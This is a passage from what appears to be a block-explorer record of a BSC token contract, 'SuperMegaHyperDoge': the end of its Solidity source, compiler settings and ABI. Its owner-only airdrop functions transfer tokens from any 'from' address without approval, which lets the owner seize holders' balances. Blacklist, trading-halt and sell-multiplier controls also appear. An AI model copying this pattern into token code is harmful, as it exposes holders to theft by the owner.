_devFee;\\n        burnFee = _burnFee;\\n        totalFee = _liquidityFee + _reflectionFee + _marketingFee + _teamFee + _burnFee + _devFee;\\n        feeDenominator = _feeDenominator;\\n        require(totalFee < feeDenominator/2, \\\"Fees cannot be more than 50%\\\");\\n    }\\n\\n    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _teamFeeReceiver, address _burnFeeReceiver, address _devFeeReceiver) external authorized {\\n        autoLiquidityReceiver = _autoLiquidityReceiver;\\n        marketingFeeReceiver = _marketingFeeReceiver;\\n        teamFeeReceiver = _teamFeeReceiver;\\n        burnFeeReceiver = _burnFeeReceiver;\\n        devFeeReceiver = _devFeeReceiver;\\n    }\\n\\n    function setSwapBackSettings(bool _enabled, uint256 _amount) external authorized {\\n        swapEnabled = _enabled;\\n        swapThreshold = _amount;\\n    }\\n\\n    function setTargetLiquidity(uint256 _target, uint256 _denominator) external authorized {\\n        targetLiquidity = _target;\\n        targetLiquidityDenominator = _denominator;\\n    }\\n\\n    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external authorized {\\n        distributor.setDistributionCriteria(_minPeriod, _minDistribution);\\n    }\\n\\n    function setDistributorSettings(uint256 gas) external authorized {\\n        require(gas < 750000);\\n        distributorGas = gas;\\n    }\\n    \\n    function getCirculatingSupply() public view returns (uint256) {\\n        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));\\n    }\\n\\n    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {\\n        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());\\n    }\\n\\n    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {\\n        return getLiquidityBacking(accuracy) > target;\\n    }\\n\\n\\n\\n/* Airdrop Begins */\\nfunction multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {\\n\\n    require(addresses.length < 501,\\\"GAS Error: max airdrop limit is 500 addresses\\\");\\n    require(addresses.length == tokens.length,\\\"Mismatch between Address and token count\\\");\\n\\n    uint256 SCCC = 0;\\n\\n    for(uint i=0; i < addresses.length; i++){\\n        SCCC = SCCC + tokens[i];\\n    }\\n\\n    require(balanceOf(from) >= SCCC, \\\"Not enough tokens in wallet\\\");\\n\\n    for(uint i=0; i < addresses.length; i++){\\n        _basicTransfer(from,addresses[i],tokens[i]);\\n        if(!isDividendExempt[addresses[i]]) {\\n            try distributor.setShare(addresses[i], _balances[addresses[i]]) {} catch {} \\n        }\\n    }\\n\\n    // Dividend tracker\\n    if(!isDividendExempt[from]) {\\n        try distributor.setShare(from, _balances[from]) {} catch {}\\n    }\\n}\\n\\nfunction multiTransfer_fixed(address from, address[] calldata addresses, uint256 tokens) external onlyOwner {\\n\\n    require(addresses.length < 801,\\\"GAS Error: max airdrop limit is 800 addresses\\\");\\n\\n    uint256 SCCC = tokens * addresses.length;\\n\\n    require(balanceOf(from) >= SCCC, \\\"Not enough tokens in wallet\\\");\\n\\n    for(uint i=0; i < addresses.length; i++){\\n        _basicTransfer(from,addresses[i],tokens);\\n        if(!isDividendExempt[addresses[i]]) {\\n            try distributor.setShare(addresses[i], _balances[addresses[i]]) {} catch {} \\n        }\\n    }\\n\\n    // Dividend tracker\\n    if(!isDividendExempt[from]) {\\n        try distributor.setShare(from, _balances[from]) {} catch {}\\n    }\\n}\\n\\nevent AutoLiquify(uint256 amountBNB, uint256 amountBOG);\\n\\n}\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    }\r\n  }\r\n}}","ABI":"[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amountBNB\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amountBOG\",\"type\":\"uint256\"}],\"name\":\"AutoLiquify\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"WBNB\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"approveMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"authorize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLiquidityReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"blacklistMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"burnFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"burnFeeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyCooldownEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountPercentage\",\"type\":\"uint256\"}],\"name\":\"clearStuckBalance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountPercentage\",\"type\":\"uint256\"}],\"name\":\"clearStuckBalance_sender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_status\",\"type\":\"bool\"},{\"internalType\":\"uint8\",\"name\":\"_interval\",\"type\":\"uint8\"}],\"name\":\"cooldownEnabled\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"cooldownTimerInterval\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"devFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"devFeeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"distributor\",\"outputs\":[{\"internalType\":\"contract DividendDistributor\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_status\",\"type\":\"bool\"}],\"name\":\"enable_blacklist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeDenominator\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCirculatingSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"accuracy\",\"type\":\"uint256\"}],\"name\":\"getLiquidityBacking\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"isAuthorized\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isBlacklisted\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"target\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"accuracy\",\"type\":\"uint256\"}],\"name\":\"isOverLiquified\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"manage_blacklist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFeeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"tokens\",\"type\":\"uint256[]\"}],\"name\":\"multiTransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"multiTransfer_fixed\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"reflectionFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"router\",\"outputs\":[{\"internalType\":\"contract IDEXRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMultiplier\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_minPeriod\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_minDistribution\",\"type\":\"uint256\"}],\"name\":\"setDistributionCriteria\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"gas\",\"type\":\"uint256\"}],\"name\":\"setDistributorSettings\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_autoLiquidityReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_marketingFeeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_teamFeeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_burnFeeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_devFeeReceiver\",\"type\":\"address\"}],\"name\":\"setFeeReceivers\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_liquidityFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_reflectionFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_marketingFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_teamFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_burnFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_devFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeDenominator\",\"type\":\"uint256\"}],\"name\":\"setFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setIsDividendExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setIsFeeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setIsTimelockExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setIsTxLimitExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxTXPercentage_base1000\",\"type\":\"uint256\"}],\"name\":\"setMaxTxPercent_base1000\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxWallPercent_base1000\",\"type\":\"uint256\"}],\"name\":\"setMaxWalletPercent_base1000\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_enabled\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"setSwapBackSettings\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_target\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_denominator\",\"type\":\"uint256\"}],\"name\":\"setTargetLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setTxLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"Multiplier\",\"type\":\"uint256\"}],\"name\":\"set_sell_multiplier\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFeeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingOpen\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_status\",\"type\":\"bool\"}],\"name\":\"tradingStatus\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"unauthorize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]","ContractName":"SuperMegaHyperDoge","CompilerVersion":"v0.7.6+commit.7338295f","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"","Proxy":"0","Implementation":"","SwarmSource":""}]}